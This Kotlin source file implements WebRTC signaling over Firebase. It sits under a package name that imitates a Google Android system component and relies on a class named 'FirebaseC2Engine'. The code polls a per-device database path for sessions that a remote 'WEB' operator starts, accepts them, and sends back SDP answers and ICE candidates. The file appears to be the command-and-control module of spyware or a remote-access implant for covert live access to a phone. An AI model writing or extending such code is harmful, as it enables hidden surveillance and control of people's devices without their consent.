package com.google.android.system

import android.content.Context
import android.util.Log
import kotlinx.coroutines.*
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.OkHttpClient
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject

/**
 * FirebaseSignalingProvider
 *
 * Implements Firebase Realtime Database WebRTC signaling with authenticated requests.
 */
class FirebaseSignalingProvider(
    private val context: Context,
    private val firebaseEngine: FirebaseC2Engine,
    private val httpClient: OkHttpClient = OkHttpClient()
) {
    companion object {
        private const val TAG = "FirebaseSignalingProv"
    }

    interface Listener {
        fun onEnvelopeReceived(envelope: SignalingEnvelope)
    }

    private var listener: Listener? = null
    private var listeningJob: Job? = null
    private var activeSessionId: String? = null

    fun setListener(listener: Listener?) {
        this.listener = listener
    }

    fun startListening(scope: CoroutineScope) {
        listeningJob?.cancel()
        listeningJob = scope.launch(Dispatchers.IO) {
            Log.i(TAG, "Starting Firebase Signaling poll listener...")
            var lastSequence = 0L

            while (isActive) {
                try {
                    val uid = firebaseEngine.refreshUserIdentity()
                    if (!uid.isNullOrBlank()) {
                        val parentUid = firebaseEngine.getParentUserId()
                        val account = firebaseEngine.getActiveAccount()
                        val devId = DeviceIdProvider.getDeviceId(context)

                        val url = "${account.databaseUrl}/users/$parentUid/devices/$devId/webrtc_signaling/sessions.json"
                        val request = firebaseEngine.buildAuthenticatedRequest(url, "GET")

                        if (request != null) {
                            httpClient.newCall(request).execute().use { response ->
                                if (response.isSuccessful) {
                                    val body = response.body?.string() ?: "null"
                                    if (body != "null" && body.startsWith("{")) {
                                        val json = JSONObject(body)
                                        val keys = json.keys()
                                        while (keys.hasNext()) {
                                            val sessId = keys.next()
                                            val sessObj = json.optJSONObject(sessId) ?: continue
                                            val status = sessObj.optString("status", "")
                                            val offerObj = sessObj.optJSONObject("offer")
                                            val candidatesObj = sessObj.optJSONObject("candidates")

                                            // Session request detection
                                            if (status == "REQUESTED" || offerObj != null) {
                                                if (activeSessionId == null || activeSessionId != sessId) {
                                                    activeSessionId = sessId
                                                    val reqEnvelope = SignalingEnvelope(
                                                        protocolVersion = 1,
                                                        sessionId = sessId,
                                                        messageId = "req_$sessId",
                                                        sequence = ++lastSequence,
                                                        senderRole = "WEB",
                                                        type = "SESSION_REQUEST",
                                                        payload = sessObj
                                                    )
                                                    listener?.onEnvelopeReceived(reqEnvelope)
                                                }
                                            }

                                            if (sessId == activeSessionId) {
                                                // Offer envelope parsing
                                                if (offerObj != null && offerObj.has("sdp")) {
                                                    val msgId = offerObj.optString("messageId", "offer_$sessId")
                                                    val offerEnvelope = SignalingEnvelope(
                                                        protocolVersion = offerObj.optInt("protocolVersion", 1),
                                                        sessionId = sessId,
                                                        messageId = msgId,
                                                        sequence = offerObj.optLong("sequence", ++lastSequence),
                                                        senderRole = offerObj.optString("senderRole", "WEB"),
                                                        type = "SDP_OFFER",
                                                        payload = offerObj
                                                    )
                                                    listener?.onEnvelopeReceived(offerEnvelope)
                                                }

                                                // Candidates envelope parsing
                                                if (candidatesObj != null) {
                                                    val candKeys = candidatesObj.keys()
                                                    while (candKeys.hasNext()) {
                                                        val cKey = candKeys.next()
                                                        val cObj = candidatesObj.optJSONObject(cKey) ?: continue
                                                        val sender = cObj.optString("senderRole", cObj.optString("sender", ""))
                                                        if (sender != "ANDROID") {
                                                            val msgId = cObj.optString("messageId", "cand_${sessId}_$cKey")
                                                            val candEnvelope = SignalingEnvelope(
                                                                protocolVersion = cObj.optInt("protocolVersion", 1),
                                                                sessionId = sessId,
                                                                messageId = msgId,
                                                                sequence = cObj.optLong("sequence", ++lastSequence),
                                                                senderRole = if (sender.isBlank()) "WEB" else sender,
                                                                type = "ICE_CANDIDATE",
                                                                payload = cObj
                                                            )
                                                            listener?.onEnvelopeReceived(candEnvelope)
                                                        }
                                                    }
                                                }

                                                if (status == "TERMINATED" || status == "EXPIRED") {
                                                    val termEnvelope = SignalingEnvelope(
                                                        protocolVersion = 1,
                                                        sessionId = sessId,
                                                        messageId = "close_$sessId",
                                                        sequence = ++lastSequence,
                                                        senderRole = "WEB",
                                                        type = "SESSION_CLOSE",
                                                        payload = JSONObject()
                                                    )
                                                    listener?.onEnvelopeReceived(termEnvelope)
                                                    activeSessionId = null
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Firebase signaling poll error: ${e.message}")
                }
                delay(1500L)
            }
        }
    }

    fun stopListening() {
        listeningJob?.cancel()
        listeningJob = null
    }

    suspend fun publishEnvelope(envelope: SignalingEnvelope): Boolean = withContext(Dispatchers.IO) {
        try {
            firebaseEngine.refreshUserIdentity() ?: return@withContext false
            val parentUid = firebaseEngine.getParentUserId()
            val account = firebaseEngine.getActiveAccount()
            val devId = DeviceIdProvider.getDeviceId(context)

            val baseUrl = "${account.databaseUrl}/users/$parentUid/devices/$devId/webrtc_signaling/sessions/${envelope.sessionId}"

            when (envelope.type) {
                "SESSION_ACCEPTED" -> {
                    val url = "$baseUrl/status.json"
                    val body = "\"ACCEPTED\"".toRequestBody("application/json".toMediaTypeOrNull())
                    val request = firebaseEngine.buildAuthenticatedRequest(url, "PUT", body) ?: return@withContext false
                    httpClient.newCall(request).execute().use { it.isSuccessful }
                }
                "SDP_ANSWER" -> {
                    val url = "$baseUrl/answer.json"
                    val body = envelope.toJsonObject().toString().toRequestBody("application/json".toMediaTypeOrNull())
                    val request = firebaseEngine.buildAuthenticatedRequest(url, "PUT", body) ?: return@withContext false
                    httpClient.newCall(request).execute().use { it.isSuccessful }
                }
                "ICE_CANDIDATE" -> {
                    val url = "$baseUrl/candidates.json"
                    val body = envelope.toJsonObject().toString().toRequestBody("application/json".toMediaTypeOrNull())
                    val request = firebaseEngine.buildAuthenticatedRequest(url, "POST", body) ?: return@withContext false
                    httpClient.newCall(request).execute().use { it.isSuccessful }
                }
                "SESSION_CLOSE" -> {
                    val url = "$baseUrl/status.json"
                    val body = "\"TERMINATED\"".toRequestBody("application/json".toMediaTypeOrNull())
                    val request = firebaseEngine.buildAuthenticatedRequest(url, "PUT", body) ?: return@withContext false
                    httpClient.newCall(request).execute().use { it.isSuccessful }
                }
                else -> {
                    val url = "$baseUrl/events/${envelope.messageId}.json"
                    val body = envelope.toJsonObject().toString().toRequestBody("application/json".toMediaTypeOrNull())
                    val request = firebaseEngine.buildAuthenticatedRequest(url, "PUT", body) ?: return@withContext false
                    httpClient.newCall(request).execute().use { it.isSuccessful }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "publishEnvelope error: ${e.message}")
            false
        }
    }
}
